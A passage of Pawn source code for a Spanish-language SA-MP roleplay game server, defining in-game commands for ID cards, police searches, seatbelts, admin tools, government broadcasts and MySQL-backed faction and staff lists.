                Mensaje(TicketOffer[playerid], -1, string);
                TicketOffer[playerid] = 999;
                TicketMoney[playerid] = 0;
			    booleano[Facturing]{playerid} = false;
			}
			else if(strcmp(params[0], "saludo", true) == 0)
			{
			    if(Saludo_ID[playerid] == 999)return Mensaje(playerid, COLOR_GRIS2, "Nadie ha ofrecido saludarte!");
			    MensajeAmbos(Saludo_ID[playerid], playerid, COLOR_GRIS2, "* El saludo ha sido cancelado.");
			    Saludo_ID[playerid] = 999;
			}
			else if(strcmp(params[0], "regalo", true) == 0)
			{
			    if(Regalo_ID[playerid] == 999)return Mensaje(playerid, COLOR_GRIS2, "Nadie te ha ofrecido un regalo!");
			    MensajeAmbos(Regalo_ID[playerid], playerid, COLOR_GRIS2, "* El regalo ha sido rechazado.");
			    booleano[Regalo_Offer]{Regalo_ID[playerid]} = false;
			    Regalo_ID[playerid] = 999;
				Regalo_ITEM[playerid] = 0;
   			}
        }
        else
        {
            Mensaje(playerid, COLOR_GRIS2, "Utiliza: /cancelar <item>");
            Mensaje(playerid, COLOR_GRIS2, "Items: telefono, multa, saludo");
        }
        return 1;
    }

COMMAND:dni(playerid, params[])
{
	if(!cuenta[playerid][cIdentificacion])return Mensaje(playerid, COLOR_ROJO, "Usted no tiene DNI.");
	
	new jugador, string[144];
	if(sscanf(params, "u", jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /dni [Usuario]");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado.");
	if(booleano[AdminDuty]{jugador})return Mensaje(playerid, COLOR_ROJO, "Administrador en servicio.");
	if(dDistanciaJugador(8.0, playerid, jugador))
	{
		MostrarIdentidad(playerid, jugador);
		format(string, sizeof(string), "* %s le muestra su DNI a %s.", PlayerName(playerid), PlayerName(jugador));
		ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	}else Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta certa de usted.");
	return 1;
}

command(dnifalso, playerid, params[]){
	new player, string[90];
	if(sscanf(params, "u", player))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /dnifalso <PlayerID>");
	if(!IsPlayerConnected(player))return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
	if(cuenta[playerid][cIdentificacionFalse] == 0)return Mensaje(playerid, COLOR_GRIS2, "No posees un DNI falso.");
	if(booleano[AdminDuty]{player})return Mensaje(playerid, COLOR_ROJO, "Administrador en Servicio.");
	if(dDistanciaJugador(8.0, playerid, player)){
		ShowDNIFalse(playerid, player);
		format(string, sizeof(string), "* %s le muestra su DNI a %s.", PlayerName(playerid), PlayerName(player));
		ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	}else return Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
	return 1;
}

	// zcmd:admin ============================================================================================================================
    command(conse, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(GetPlayerState(playerid) == 2){
			return SetVehiclePosEx(GetPlayerVehicleID(playerid), 552.4600, -1275.2721, 17.2482);
		}
		else {
			SetPosEx(playerid, 552.4600, -1275.2721, 17.2482, 0, 0 , 0);
			return 1;
		}
    }
    command(healcar, playerid, params[])
    {
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(cuenta[playerid][cAdministrador] < 5)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!sscanf(params, "i", params[0]))
		{
		    return SetVehicleHealth(GetPlayerVehicleID(playerid), params[0] * 10);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /healcar <HP>");
        return 1;
    }
	command(aengineon, playerid, params[]){
		if(cuenta[playerid][cAdministrador] < 4)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo!");
  		new engine, lights, alarm, doors, bonnet, boot, objective;
    	GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
	    vehiculoEncendido[GetPlayerVehicleID(playerid)] = true;
		return SetVehicleParamsEx(GetPlayerVehicleID(playerid), 1, lights, alarm, doors, bonnet, boot, objective);
	}
	command(carstat, playerid, params[])
	{
	    new string[64], idcar = GetPlayerVehicleID(playerid);
	    if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo!");
		format(string, sizeof(string), "Modelo: %s - Dueño: %s(Owned:%d) - ID: %d", autos[idcar][cName], autos[idcar][cOwner], autos[idcar][cOwned], idcar);
		return Mensaje(playerid, COLOR_GRIS2, string);
	}
    command(changeit, playerid, params[]){
	    new idcar = GetPlayerVehicleID(playerid);
		if(cuenta[playerid][cAdministrador] >= 6 || Team_LSPD(playerid)){
			if(cuenta[playerid][cRango] >= 3 || cuenta[playerid][cAdministrador] >= 6){
				if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_ROJO, "No estás en un vehículo!");
				if(!EsComprable(idcar))return Mensaje(playerid, COLOR_ROJO, "No es un vehículo de venta!");
				EstacionarAuto(playerid, idcar);
				Mensaje(playerid, COLOR_VERDE, "Nuevas coordenadas guardadas. Ahora el vehículo aparecerá aqui!");
			} else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		} else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		return 1;
 	}
   	command(mapa, playerid, params[])
	{
 		if(!IsAtMap(playerid))return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No estas delante de un mapa.");
		ShowPlayerDialog(playerid, DIALOGO_MAPA, DIALOG_STYLE_LIST, "{018CFE}Puntos de interes", "{FFFFFF}» Ayuntamiento\n» Comisaria\n» Taller\n» Licencieria\n» Binco\n» 24-7 Vinewood\n» 24-7 Unity\n» 24-7\n» Deposito de la LSPD\n» Banco\n» Consecionaria\n» Paintball\n» Casino\n» Pista de Karting\n» Localizador de Vehiculos\n» Tienda de Electronica\n» Cabina de Anuncios (/ad)\n» Prision Federal\n» Trabajos", "Aceptar", "Salir");
		return 1;
 	}

	command(desrentarveh, playerid, params[])
    {
        if(HireKey[playerid] == 9999)return Mensaje(playerid, COLOR_GRIS2, "No has rentado ningún vehículo!");
  			SetVehicleToRespawn(HireKey[playerid]);
		    SetVehicleParamsEx(HireKey[playerid], 0, 0, 0, 0, 0, 0, 0);
			vehiculoEncendido[HireKey[playerid]] = false;
			HireKey[playerid] = 9999;
			HireKeyTime[playerid] = 0;
        return 1;
    }
command(subirnivel, playerid, params[]){
	if(cuenta[playerid][cNivel] >= 0){
		new nxtlevel = cuenta[playerid][cNivel]+1, expamount = nxtlevel*levelexp, string[128];
		if(cuenta[playerid][cExperiencia] < expamount){
			format(string, sizeof(string), "Necesitas %d/%d puntos de respeto para subir de nivel.", cuenta[playerid][cExperiencia], expamount);
			Mensaje(playerid, COLOR_GRIS1, string);
		}else{
			format(string, sizeof(string), "~w~Felicidades!! ~n~~n~Ahora eres nivel ~g~%d", nxtlevel);
			GameTextForPlayer(playerid, string, 5000, 3);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			cuenta[playerid][cNivel]++;
			cuenta[playerid][cExperiencia] = 0;
			new BonusXLevel = cuenta[playerid][cNivel] * 150;
			ganaDinero(playerid, BonusXLevel);
			format(string, sizeof(string), "Usted ha ganado %d$ como bonus por subir de nivel.", BonusXLevel);
			Mensaje(playerid, COLOR_VERDE, string);
		}
	}
	return 1;
}

command(cachear, playerid, params[])
{
	if(Team_LSPD(playerid) || Team_FBI(playerid))
	{
		if(!sscanf(params, "u", params[0]))
		{
			if(IsPlayerConnected(params[0]) && dDistanciaJugador(8.0, playerid, params[0])){
			new wh_q, sweapon, sammo, drugs, string[128];
			
			for (new i=0; i<9; i++)
			{
				GetPlayerWeaponData(params[0], i, sweapon, sammo);
				if(sweapon != 0 && sammo != 0)  wh_q ++;
			}
			ClearChatbox(playerid, 21);
			format(string, sizeof(string), "|__ Cacheo de %s __|", PlayerName(playerid));
			Mensaje(playerid, COLOR_BLANCO, string);
			if(wh_q) Mensaje(playerid, COLOR_GRIS2, "El sujeto va armado.");
			else Mensaje(playerid, COLOR_GRIS2, "El sujeto no porta armas.");
			
			if(cuenta[params[0]][cSpeed] > 0) drugs++;
				if(cuenta[params[0]][cExtasis] > 0) drugs++;
				if(cuenta[params[0]][cRitalin] > 0) drugs++;
				if(cuenta[params[0]][cHeroina] > 0) drugs++;
				if(cuenta[params[0]][cMarihuana] > 0) drugs++;

				if(drugs) Mensaje(playerid, COLOR_GRIS2, "El sujeto contiene drogas.");
				else Mensaje(playerid, COLOR_GRIS2, "El sujeto no porta drogas.");

				if(cuenta[params[0]][cSemillas][0] > 0) drugs++;
				if(cuenta[params[0]][cSemillas][1] > 0) drugs++;
				if(cuenta[params[0]][cSemillas][2] > 0) drugs++;
				if(cuenta[params[0]][cSemillas][3] > 0) drugs++;
				if(cuenta[params[0]][cSemillas][4] > 0) drugs++;

				if(drugs) Mensaje(playerid, COLOR_GRIS2, "El sujeto porta semillas.");
				else Mensaje(playerid, COLOR_GRIS2, "El sujeto no porta semillas.");
				
				if(cuenta[params[0]][cMateriales] > 0) Mensaje(playerid, COLOR_GRIS2, "El sujeto porta material armamentístico.");
				else Mensaje(playerid, COLOR_GRIS2, "El sujeto no porta material armamentístico.");

				format(string, sizeof(string), "* %s cachea a %s en busca de objetos.", PlayerName(playerid), PlayerName(params[0]));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			} else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado o muy lejos.");
		}else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /cachear [ID]");
	}else return Mensaje(playerid, COLOR_GRIS2, "No puedes hacer esto!");
	return 1;
}

command(revisar, playerid, params[])
{
	if(!sscanf(params, "u", params[0]))
	{
		if(IsPlayerConnected(params[0]) && dDistanciaJugador(8.0, playerid, params[0])){
		new wh_q, sweapon, sammo, drugs, string[128];

		for (new i=0; i<9; i++)
		{
			GetPlayerWeaponData(params[0], i, sweapon, sammo);
			if(sweapon != 0 && sammo != 0)  wh_q ++;
		}
		ClearChatbox(playerid, 21);
		format(string, sizeof(string), "|__ Objetos de %s __|", PlayerName(playerid));
		Mensaje(playerid, COLOR_BLANCO, string);
		if(wh_q) Mensaje(playerid, COLOR_GRIS2, "El sujeto va armado.");
		else Mensaje(playerid, COLOR_GRIS2, "El sujeto no porta armas.");

			if(cuenta[params[0]][cSpeed] > 0) drugs++;
			if(cuenta[params[0]][cExtasis] > 0) drugs++;
			if(cuenta[params[0]][cRitalin] > 0) drugs++;
			if(cuenta[params[0]][cHeroina] > 0) drugs++;
			if(cuenta[params[0]][cMarihuana] > 0) drugs++;

			if(drugs) Mensaje(playerid, COLOR_GRIS2, "El sujeto porta drogas.");
			else Mensaje(playerid, COLOR_GRIS2, "El sujeto no porta drogas.");

			if(cuenta[params[0]][cDinero] > 4000) Mensaje(playerid, COLOR_GRIS2, "El sujeto tiene mas de 4000$ en mano.");
			else Mensaje(playerid, COLOR_GRIS2, "El sujeto tiene menos de 4000$ en mano.");

			format(string, sizeof(string), "* %s revisa a %s en busca de objetos.", PlayerName(playerid), PlayerName(params[0]));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		}else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado o muy lejos.");
	}else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /revisar [ID]");
	return 1;
}
	
COMMAND:cinturon(playerid, params[])
{
	new tmp[126];
	if(IsPlayerInAnyVehicle(playerid) && !SonMotos(playerid))
	{
		switch(booleano[gCinturon]{playerid})
		{
			case true:
			{
				format(tmp, sizeof(tmp), "* %s se desabrocha el cinturón.", PlayerName(playerid));
				ProxDetector(30.0, playerid, tmp, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				booleano[gCinturon]{playerid} = false;
			}
			case false:
			{
				format(tmp, sizeof(tmp), "* %s se abrocha el cinturón.", PlayerName(playerid));
				ProxDetector(30.0, playerid, tmp, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				booleano[gCinturon]{playerid} = true;
			}
		}
		return 1;
	}
	Mensaje(playerid, COLOR_GRIS2, "No estas en un vehiculo!");
	return 1;
}
//
COMMAND:vercinturon(playerid, params[])
{
	if(!IsACop(playerid))return Mensaje(playerid, COLOR_GRIS2, "No eres policía!");
	new tmp[126], jugador;
	if(sscanf(params, "u", jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /vercinturon [Usuario]");
	
	if(!IsPlayerInAnyVehicle(jugador))return Mensaje(playerid, COLOR_GRIS2, "El jugador no está en un vehículo!");
	if(!dDistanciaJugador(5.0, playerid, jugador))return Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos!");
	switch(booleano[gCinturon]{jugador})
	{
		case true:
		{
			format(tmp, sizeof(tmp), "* %s tiene el cinturón abrochado.", PlayerName(jugador));
			Mensaje(playerid, COLOR_VERDE, tmp);
		}
		case false:
		{
			format(tmp, sizeof(tmp), "* %s no tiene el cinturón abrochado.", PlayerName(jugador));
			Mensaje(playerid, COLOR_ROJO, tmp);
		}
	}
	return 1;
}
    command(verip, playerid, params[])
    {
        if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		if(cuenta[playerid][cAdministrador] < 5)return Mensaje(playerid, COLOR_GRIS, "No autorizado!");
        if(!sscanf(params, "u", params[0]))
        {
            new ip[20], string[64];
            GetPlayerIp(params[0], ip, sizeof(ip));
            format(string, sizeof(string), "* Player: %s IP: %s", PlayerName(params[0]), ip);
            Mensaje(playerid, COLOR_GRIS2, string);
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /verip <PlayerID>");
        return 1;
    }
command(cuenta, playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
		if(booleano[gIngreso]{playerid})
		{
			UpdatePlayerStat(playerid);
			ShowStats(playerid, playerid);
		}
	}
	return 1;
}



	command(gob, playerid, params[])
	{
		new string[128], rango[64];
	    if(sscanf(params, "s[128]", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /gob <Texto>");
	    if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
    	if(cuenta[playerid][cLider] == 1)
		{
            if(IsPlayerInRangeOfPoint(playerid, 5.0, 313.1193, -1565.2349, 3267.0879))
            {
 			  format(string, sizeof(string), "[LSPD] Comisario %s: %s", PlayerName(playerid), params[0]);
			  MensajeGlobal(0x00ACFFFF, string);
			} else Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no está en el lugar indicado para iniciar una transmición.");
			return 1;
		}
  		else if(cuenta[playerid][cLider] == 2)
   		{
            if(IsPlayerInRangeOfPoint(playerid, 5.0, 2913.1934, 2121.9990, 0.9219))
            {
         	  format(string, sizeof(string), "[GNSA] Coronel %s: %s", PlayerName(playerid), params[0]);
	    	  MensajeGlobal(0x00ACFFFF, string);
	    	} else Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no está en el lugar indicado para iniciar una transmición.");
		return 1;
		}
   		else if(cuenta[playerid][cLider] == 3)
   		{
            if(IsPlayerInRangeOfPoint(playerid, 5.0, -2672.9465, 519.1580, 48.0799))
            {
         	  format(string, sizeof(string), "[LSMC] Director %s: %s", PlayerName(playerid), params[0]);
	    	  MensajeGlobal(0x00ACFFFF, string);
	    	} else Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no está en el lugar indicado para iniciar una transmición.");
		return 1;
		}
		else if(Gobierno(playerid))
		{
			switch(cuenta[playerid][cRango])
  			{
				case 6:     rango = "Presidente";
				case 5:     rango = "Vice-Presidente";
				case 4:     rango = "Alcalde de LS";
      		}
			if(cuenta[playerid][cMiembro] == 6 && cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
			if(IsPlayerInRangeOfPoint(playerid, 5.0, 357.3634, 113.6318, 1025.2617))
            {
			  format(string, sizeof(string), "[GOBIERNO] %s %s: %s", rango, PlayerName(playerid), params[0]);
			  MensajeGlobal(0x00ACFFFF, string);
            } else Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no está en el lugar indicado para iniciar una transmición.");
			return 1;
		}
		else if(cuenta[playerid][cLider] == 9)
		{
           if(IsPlayerInRangeOfPoint(playerid, 5.0, 210.5389, 149.9392, 1003.0234))
           {
			format(string, sizeof(string), "[FBI] Director %s: %s", PlayerName(playerid), params[0]);
			MensajeGlobal(0x00ACFFFF, string);
           } else Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no está en el lugar indicado para iniciar una transmición.");
		   return 1;
		}
		else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		return 1;
	}
 	command(impuesto, playerid, params[])
	{
	    if(Presidente(playerid))
	    {
	        if(!sscanf(params, "i", params[0]))
	        {
	            if(params[0] < 0 || params[0] > 200)return Mensaje(playerid, COLOR_GRIS2, "Valor entre 1 - 200");

	            new string[90];
	            TaxValue = params[0]; 
				format(string, sizeof(string), "* [GOBIERNO] El impuesto por ciudano se ha establecido en %d$.", TaxValue);
				MensajeGlobal(0x00ACFFFF, string);

	        }
	        else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /impuesto <cantidad>");
	    }
	    else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	    return 1;
 	}
 	command(fondoestado, playerid, params[])
	{
	    new string[90];
	    if(Presidente(playerid))
	    {
	        if(!sscanf(params, "i", params[0]))
	        {
	            if (params[0] > Tax || params[0] < 1)return Mensaje(playerid, COLOR_GRIS2, "Cantidad erróena.");

				cuenta[playerid][cDineroBanco] += params[0];    Tax -= params[0];

				format(string, sizeof(string), "Extraiste %d$ de los fondos del estado (%d$)", params[0], Tax);
				Mensaje(playerid, COLOR_AMARILLO2, string);
				format(string, sizeof(string), "Los fondos extraídos pasaron a tu cuenta bancaria (%d$)", cuenta[playerid][cDineroBanco]);
				Mensaje(playerid, COLOR_AMARILLO3, string); 
	        }
	        else
	        {
	            Mensaje(playerid, COLOR_GRIS2, "Utiliza: /fondoestado <cantidad>");
	            format(string, 90, "* Hay %d de fondos.", Tax);
	            Mensaje(playerid, COLOR_GRIS2, string);
	        }
		}
		else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		return 1;
	}
	command(altavoz, playerid, params[])
	{
        if(cuenta[playerid][cTelefono] == 0)return Mensaje(playerid, COLOR_GRIS2, "Usted no tiene un telefono.");
        if(Mobile[playerid] == 255)return Mensaje(playerid, COLOR_GRIS, "Usted no esta en una llamada telefonica.");
        if(IsPlayerConnected(playerid))
        {
			if(Speaker[playerid] == 0)
			{
				Mensaje(playerid, COLOR_AMARILLO3, "* Beep * El altavoz esta conectado.");
				Speaker[playerid] = 1;
				return 1;
			}
			if(Speaker[playerid] == 1)
			{
				Mensaje(playerid, COLOR_AMARILLO3, "* Beep * El altavoz se a desconectado.");
				Speaker[playerid] = 0;
				return 1;
			}
		}
		return 1;
	}
    command(miranda, playerid, params[])
    {
        if(IsACop(playerid))
        {
            new string[128];
	        format(string, sizeof(string), "* %s lee los 'Derechos Miranda'", PlayerName(playerid));
	        ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	        format(string, sizeof(string), "%s dice: Tienes derecho a guardar silencio, todo lo que diga puede usarse en su contra.", PlayerName(playerid));
	        ProxDetector(30.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	        format(string, sizeof(string), "%s dice: Tiene derecho a un abogado, si no puede pagar uno, se le asignará uno a costas del Estado.", PlayerName(playerid));
	        ProxDetector(30.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	        format(string, sizeof(string), "%s dice: Tiene derecho a una llamada por teléfono.", PlayerName(playerid));
	        ProxDetector(30.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	        format(string, sizeof(string), "%s dice: ¿De acuerdo señor?", PlayerName(playerid));
	        ProxDetector(30.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
        }
        return 1;
    }
    command(timbre, playerid, params[])
    {
        for(new i = 0; i < sizeof(casa); i++)
		{
			if (IsPlayerInRangeOfPoint(playerid, 3.0, casa[i][hEntrancex], casa[i][hEntrancey], casa[i][hEntrancez]))
			{
			    new string[76];
   				format(string, sizeof(string), "* %s toca el timbre.", PlayerName(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				ProxDetector(30.0, playerid, "Diiing Doooong ... Diiing Doooong", COLOR_AMARILLO2, COLOR_AMARILLO2, COLOR_AMARILLO2, COLOR_AMARILLO2, COLOR_AMARILLO2);
				for(new p = 0; p < MAX_PLAYERS; p++)
				{
				    if(IsPlayerInRangeOfPoint(p, 30.0, casa[i][hExitx], casa[i][hExity], casa[i][hExitz]))
				    {
    					ProxDetector(30.0, p, "Diiing Doooong ... Diiing Doooong", COLOR_AMARILLO2, COLOR_AMARILLO2, COLOR_AMARILLO2, COLOR_AMARILLO2, COLOR_AMARILLO2);
    				}
				}
			}
		}
		return 1;
    }
	
COMMAND:ayuda(playerid, params[])
{
	ShowPlayerDialog(playerid, SOPORTE_D, DIALOG_STYLE_LIST, "ZonaZero{E48584} Soporte.", "» Comandos Generales\n» Sistema de Casas\n» Sistema de Vehiculos\n» Sistema de Negocios\n» Sistema de Familias\n» Comandos para Lideres\n» Sistema de Facciones\n» Comandos de Trabajo\n» Ayuda de Rol", "Aceptar", "Cancelar");
	return 1;
}
COMMAND:ah2014(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] == 2014)
	{
		Mensaje(playerid, COLOR_VERDE, "Comandos especiales para DUEÑOS");
		Mensaje(playerid, COLOR_GRIS, "[*] /crearfaccion: {FFFFFF}Crea una Faccion Oficial");
		Mensaje(playerid, COLOR_GRIS, "[*] /listafaccion: {FFFFFF}Visualiza las facciones {008000}DISPONIBLES");
		Mensaje(playerid, COLOR_GRIS, "[*] /efaccion: {FFFFFF}Elimina una faccion Oficial completamente");
		Mensaje(playerid, COLOR_GRIS, "[*] /hqboveda: {FFFFFF}Crea una Boveda para una Faccion Ilegal");
		Mensaje(playerid, COLOR_GRIS, "[*] /hqmover: {FFFFFF}Crea un Territorio para la Faccion Ilegal");
		Mensaje(playerid, COLOR_GRIS, "[*] /colorid: {FFFFFF}Muestra los colores disponibles para los territorios");
		Mensaje(playerid, COLOR_GRIS, "[*] /zonacolor: {FFFFFF}Cambia el color de un territorio");
		Mensaje(playerid, COLOR_GRIS, "[*] /crearautofacc: {FFFFFF}Crea un auto para una faccion");
		Mensaje(playerid, COLOR_GRIS, "[*] /borrarautofacc: {FFFFFF}Borra el auto de una faccion, id con /dl");
		Mensaje(playerid, COLOR_GRIS, "[*] /editarautofacc: {FFFFFF}Cambia el Color y la posicion de spawn de un auto de faccion");
		Mensaje(playerid, COLOR_GRIS, "[*] /avenderauto: {FFFFFF}Vende un auto de cualquier usuario");
		Mensaje(playerid, COLOR_GRIS, "[*] /eliminarreja: {FFFFFF}Eliminar rejas, recuerda el ID");
		Mensaje(playerid, COLOR_GRIS, "[*] /editarreja: {FFFFFF}Edita rejas, ponte cerca de la rejas");
		Mensaje(playerid, COLOR_GRIS, "[*] /crearreja: {FFFFFF}Crea una reja! No uses ID`s repetidas");
		Mensaje(playerid, COLOR_GRIS, "[*] /lucas: {FFFFFF}Sala de eventos!");
		Mensaje(playerid, COLOR_GRIS, "[*] /descongelartodos: {FFFFFF}");
		return 1;
	}
	return 0;
}
COMMAND:editarfaccion(playerid, params[])
{
	new facc = cuenta[playerid][cMiembro], str[42], string[50 * 8];
	if(!cuenta[playerid][cLider])return Mensaje(playerid, COLOR_GRIS2, "No eres líder de facción.");
	if(facc < 16 || facc > 45)return Mensaje(playerid, COLOR_GRIS2, "Esta faccion no se puede editar.");
	
	format(str, sizeof(str), "Nombre: %s\n", IFacciones[facc-16][If@nombre]);
	strcat(string, str);
	
	format(str, sizeof(str), "Rango 1: %s\n", IFacciones[facc-16][If@rango0]);
	strcat(string, str);
	
	format(str, sizeof(str), "Rango 2: %s\n", IFacciones[facc-16][If@rango1]);
	strcat(string, str);
	
	format(str, sizeof(str), "Rango 3: %s\n", IFacciones[facc-16][If@rango2]);
	strcat(string, str);
	
	format(str, sizeof(str), "Rango 4: %s\n", IFacciones[facc-16][If@rango3]);
	strcat(string, str);
	
	format(str, sizeof(str), "Rango 5: %s\n", IFacciones[facc-16][If@rango4]);
	strcat(string, str);
	
	format(str, sizeof(str), "Rango 6: %s\n", IFacciones[facc-16][If@rango5]);
	strcat(string, str);
	
	ShowPlayerDialog(playerid, DIALOGO_FACCION_EDITAR, DIALOG_STYLE_LIST, "Edicion de Faccion.", string, "Aceptar", "Salir");
	return 1;
}
COMMAND:staff(playerid, params[])
{
	new Cache:mdl, inv20, tadmin, iunico, ianivel, ionline, iadmin = cuenta[playerid][cAdministrador];
	
	if(iadmin < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	
	mdl = mysql_query(servidor[mysqlControl], "SELECT nombre, online, ultconn, niveladmin, id, tadmin, inv20 FROM zz_usuarios WHERE niveladmin > 0;", true);
	new tmp[24], tmp2[32], tmp3[124], tmp4[112 * 50], encontro = 0;
	
	strcat(tmp4, "Nombre(Nivel)\tUltima Conexion\tHoras Duty\tRatio\n");
	for(new x=0;x<cache_get_row_count();x++)
	{
		cache_get_row(x, 0, tmp, servidor[mysqlControl], sizeof(tmp));
		ionline = cache_get_row_int(x, 1, servidor[mysqlControl]);
		cache_get_row(x, 2, tmp2, servidor[mysqlControl], sizeof(tmp2));
		ianivel = cache_get_row_int(x, 3, servidor[mysqlControl]);
		iunico = cache_get_row_int(x, 4, servidor[mysqlControl]);
		tadmin = cache_get_row_int(x, 5, servidor[mysqlControl]);
		inv20 = cache_get_row_int(x, 6, servidor[mysqlControl]);
		
		if(!ionline)
		{
			entero[playerid][opid][encontro] = iunico;
			entero[playerid][opid3][encontro] = ianivel;
			format(tmp3, sizeof(tmp3), "%s(%d)\t%s\t%d\t%.2f\n", tmp, ianivel, tmp2, inv20, float(inv20) / float(((gettime()-tadmin) /60)/60));
			strcat(tmp4, tmp3);
			encontro++;
		}
	}
	cache_delete(mdl);
	if(!encontro)return Mensaje(playerid, COLOR_GRIS2, "No hay administradores desconectados.");
	ShowPlayerDialog(playerid, DIALOGO_EDITAR_STAFF, DIALOG_STYLE_TABLIST_HEADERS, "Lista de Miembros", tmp4, "Aceptar", "Cancelar");
	return 1;
}
COMMAND:faccion(playerid, params[])
{
	new Cache:mdl, iunico, imiembro, irango, ionline, facc = cuenta[playerid][cMiembro];
	new inombre[24], iult[24], consulta[94], string[80], str[64 * 50];
	new noencontro = 0;
	
	if(!facc)return Mensaje(playerid, COLOR_GRIS2, "Usted no pertenece a una faccion.");
	if(!cuenta[playerid][cLider])return Mensaje(playerid, COLOR_GRIS2, "Usted no es un lider.");
	
	mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "SELECT nombre, online, ultconn, lider, miembro, rango, id FROM zz_usuarios WHERE miembro=%d;", facc);	
	mdl = mysql_query(servidor[mysqlControl], consulta, true);
	
	strcat(str, "Nombre\tRango\tUltima Conexion\n");
	for(new i=0; i<cache_get_row_count(); i++)
	{
		cache_get_row(i, 0, inombre, servidor[mysqlControl], sizeof(inombre));
		ionline = cache_get_row_int(i, 1, servidor[mysqlControl]);	
		cache_get_row(i, 2, iult, servidor[mysqlControl], sizeof(iult));
		imiembro = cache_get_row_int(i, 4, servidor[mysqlControl]);
		irango = cache_get_row_int(i, 5, servidor[mysqlControl]);
		iunico = cache_get_row_int(i, 6, servidor[mysqlControl]);
		
		if(!ionline && imiembro == cuenta[playerid][cMiembro])
		{
			entero[playerid][opid][noencontro] = iunico;
			entero[playerid][opid3][noencontro] = irango;
			format(string, sizeof(string), "[%s]\t[%s]\t[%s]\n", inombre, obtenerRango(imiembro, irango), iult);
			strcat(str, string);
			noencontro++;
		}
	}	
	cache_delete(mdl);
	if(!noencontro)return Mensaje(playerid, COLOR_ROJO, "Esta faccion no tiene miembros [OFFLINE].");
	ShowPlayerDialog(playerid, DIALOGO_FACCION_A, DIALOG_STYLE_TABLIST_HEADERS, "Panel Miembros [OFFLINE]", str, "Aceptar", "Cancelar");
	return 1;
}
COMMAND:efaccion(playerid, params[])
{
	new facc;
